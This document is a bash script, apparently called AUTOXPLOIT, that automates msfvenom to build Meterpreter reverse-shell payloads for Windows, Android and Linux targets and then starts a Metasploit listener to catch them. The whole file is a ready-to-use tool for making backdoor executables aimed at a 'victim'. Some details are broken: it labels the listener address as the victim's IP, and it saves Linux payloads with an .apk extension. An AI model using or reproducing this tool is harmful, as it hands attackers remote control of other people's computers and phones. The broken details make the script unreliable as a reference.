#!/bin/bash
Black='\033[1;30m'        # Black
Red='\033[1;31m'          # Red
Green='\033[1;32m'        # Green
Yellow='\033[1;33m'       # Yellow
Blue='\033[1;34m'         # Blue
Purple='\033[1;35m'       # Purple
Cyan='\033[1;36m'         # Cyan
White='\033[1;37m'        # White
NC='\033[0m'
blue='\033[0;34m'
white='\033[0;37m'
lred='\033[0;31m'

root=$( id -u )
folder='~/Desktop/payloads'



logo () {
    echo -e "\033[1;31m  \t
  \t░█▀█░█░█░▀█▀░█▀█░█░█░█▀█░█░░░█▀█░▀█▀░▀█▀
  \t░█▀█░█░█░░█░░█░█░▄▀▄░█▀▀░█░░░█░█░░█░░░█░
  \t░▀░▀░▀▀▀░░▀░░▀▀▀░▀░▀░▀░░░▀▀▀░▀▀▀░▀▀▀░░▀░
       \033[1;36m--=By: Yashvendra Kashyap a.k.a y_k_007=--     
";

}

target () {
    echo -ne "\n${Blue}[#] Enter IP of the victim's machine: ${White}"; read ip
    echo -ne "${Blue}[#] Enter a Port no.: ${White}"; read port
    echo -ne "${Blue}[#] Enter the FILE name: ${White}"; read file
}

windows () {
    clear
    logo 
    echo -e "\n"
    sleep 0.3
    echo -e "${Blue}+-------------------------------------------------------+"
    echo -e "+\t${Green}Available Payloads for ${Yellow}[${Purple}Windows${Yellow}]   ${Blue}             +"
    echo -e "${Blue}+-------------------------------------------------------+${NC}"
    sleep 0.3
    echo -ne "${Blue}+ "
    echo -e "${White}[1] ${Purple}windows/meterpreter/reverse_tcp           ${Blue}        +"
    echo -e "+ ${White}[2] ${Purple}windows/meterpreter/reverse_http         ${Blue}         +"
    echo -e "+ ${White}[3] ${Purple}windows/meterpreter/reverse_tcp_dns         ${Blue}      +"
    echo -e "+ ${White}[4] ${Purple}windows/meterpreter/reverse_https         ${Blue}        +"
    echo -e "+ ${White}[5] ${Purple}windows/meterpreter/reverse_tcp_uuid        ${Blue}      +"
    echo -e "+ ${White}[6] ${Purple}windows/meterpreter/reverse_winhttp          ${Blue}     +"
    echo -e "+ ${White}[7] ${Purple}windows/meterpreter/reverse_winhttps        ${Blue}      +"
    echo -e "${Blue}+-------------------------------------------------------+"
    sleep 0.3
    echo -ne "${Green}[#] Choose a payload: ${White}" 
    read payloadWindow

    case  $payloadWindow  in

        1)
        target
        echo
        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
        payload='windows/meterpreter/reverse_tcp' ;;

        2)
        target
        echo
        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_http LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
        payload='windows/meterpreter/reverse_http' ;;

        3)
        target
        echo
        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
        payload='windows/meterpreter/reverse_tcp_dns' ;;

        4)
        target
        echo 
        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
        payload='windows/meterpreter/reverse_https' ;;
    
        5)
        target
        echo 
        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_tcp_uuid LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
        payload='windows/meterpreter/reverse_tcp_uuid' ;;

        6)
        target
        echo 
        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_winhttp LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
        payload='windows/meterpreter/reverse_winhttp' ;;
    
        7)
        target
        echo 
        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p windows/meterpreter/reverse_winhttps LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
        payload='windows/meterpreter/reverse_winhttps' ;;
    
        *)
        echo -e "${Cyan}[*] INVALID CHOICE!" 
       	sleep 1 
      	exit ;;

    esac
}

android () {
    clear
    logo
    echo -e "\n"
    echo -e "${Blue}+-------------------------------------------------------+"
    echo -e "+\t${Green}Available Payloads for ${Yellow}[${Purple}Android${Yellow}]   ${Blue}             +"
    echo -e "${Blue}+-------------------------------------------------------+${NC}"
    sleep 0.3
    echo -ne "${Blue}+ "
    echo -e "${White}[1] ${Purple}android/meterpreter/reverse_tcp           ${Blue}        +"
    echo -e "+ ${White}[2] ${Purple}android/meterpreter/reverse_https         ${Blue}        +"
    echo -e "+ ${White}[3] ${Purple}android/meterpreter/reverse_http         ${Blue}         +"
    echo -e "${Blue}+-------------------------------------------------------+"
    sleep 0.3
    echo -ne "${Green}[#] Choose a payload: ${White}" 
    read payloadAndro

    case  $payloadAndro  in

        1)
        target
        echo
        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
        payload='android/meterpreter/reverse_tcp' ;;

        2)
        target
        echo
        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p android/meterpreter/reverse_https LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
        payload='android/meterpreter/reverse_https' ;;
	
	3)
	target
	echo 
	  echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
        echo
	msfvenom -p android/meterpreter/reverse_http LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
        payload='android/meterpreter/reverse_http' ;;

	* )
        echo -e "${Cyan}[*] INVALID CHOICE!"  
       	sleep 1 
      	exit ;;

    esac
}

linux (){
    clear
    logo
    echo -e "\n"
    echo -e "${Blue}+-------------------------------------------------------+"
    echo -e "+\t${Green}Available Payloads for ${Yellow}[${Purple}Linux${Yellow}]     ${Blue}             +"
    echo -e "${Blue}+-------------------------------------------------------+${NC}"
    sleep 0.3
    echo -ne "${Blue}+ "
    echo -e "${White}[1] ${Purple}linux/x86/meterpreter_reverse_tcp         ${Blue}        +"
    echo -e "+ ${White}[2] ${Purple}linux/x86/meterpreter_reverse_https       ${Blue}        +"
    echo -e "+ ${White}[3] ${Purple}linux/x86/meterpreter_reverse_http       ${Blue}         +"
    echo -e "+ ${White}[4] ${Purple}linux/x86/meterpreter/reverse_tcp_uuid   ${Blue}         +"
    echo -e "+ ${White}[5] ${Purple}linux/x86/meterpreter/reverse_ipv6_tcp   ${Blue}         +"
    echo -e "+ ${White}[6] ${Purple}linux/x86/meterpreter/reverse_nonx_tcp   ${Blue}         +"
    echo -e "${Blue}+-------------------------------------------------------+"
    sleep 0.3
    echo -ne "${Green}[#] Choose a payload: ${White}" 
    read payloadlinux
  
    case  $payloadlinux  in

        1)
        target
        echo
        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
        payload='linux/x86/meterpreter_reverse_tcp' ;;

        2)
        target
        echo
        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter_reverse_https LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
        payload='linux/x86/meterpreter_reverse_https' ;;

        3)
        target
        echo
          echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter_reverse_http LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
        payload='linux/x86/meterpreter_reverse_http' ;;

        4)
        target
        echo
          echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter/reverse_tcp_uuid LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
        payload='linux/x86/meterpreter/reverse_tcp_uuid' ;;
        
        5)
        target
        echo
          echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter/reverse_ipv6_tcp LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
        payload='linux/x86/meterpreter/reverse_ipv6_tcp' ;;
        
        6)
        target
        echo
          echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter/reverse_nonx_tcp LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
        payload='linux/x86/meterpreter/reverse_nonx_tcp' ;;

    
        * )
	echo -e "${Cyan}[*] INVALID CHOICE!"  
        sleep 1
        exit ;;

    esac
}


if [ $root  != 0 ] ; then
    echo -e "${Purple}[#] Run this Script as 'sudo'! "
    sleep 2
    exit
fi

if [ -e  $folder ] ; then
    cd ~/Desktop/payloads
else
    mkdir ~/Desktop/payloads &&  cd ~/Desktop/payloads
fi


clear
logo
sleep 0.3
echo -e "${Yellow}[*] Payloads are available For-\n"
sleep 0.3
echo -e " ${White}[1] ${Blue}Windows"
echo -e " ${White}[2] ${Blue}Android"
echo -e " ${White}[3] ${Blue}Linux\n"
sleep 0.3
echo -ne "${Green}[#] Choose Victim's OS:${White} " 
read OS

case  $OS  in

    1)
    windows;;

    2)
    android ;;

    3)
    linux ;;

    * )
    echo -e "${Cyan}[*] INVALID OPTION"  
    sleep 1
    echo -e "${Cyan}[*] Exiting..."
    sleep 0.2 
    exit ;;

esac

echo -e "${Purple}[*] Payload has been saved in the desktop folder '${Cyan}payloads${Purple}'"
sleep 0.3
echo -ne "${Green}[#] Do you want to automatically configure the handler and let it listen? [${Cyan}y${Green}/${Cyan}n${Green}]: ${White}" 
read p
if [ $p  =  "y" ] 
then
    clear
    echo -e "${Green}[*] OPENING ${Purple}MSFCONSOLE${Green}... "
    msfconsole -q -x "use multi/handler; set PAYLOAD $payload ; set LHOST $ip ; set LPORT $port ; exploit "
elif [ $p  =  "n" ] 
then
    echo -e "${Cyan}[*] Byee! See you soon."  
    sleep 0.2 
    exit
else
    echo -e "${Cyan}[*] INVALID OPTION" 
    sleep 0.2 
    echo -e "${Cyan}[*] Exiting..."  
    sleep 0.2 
    exit
fi


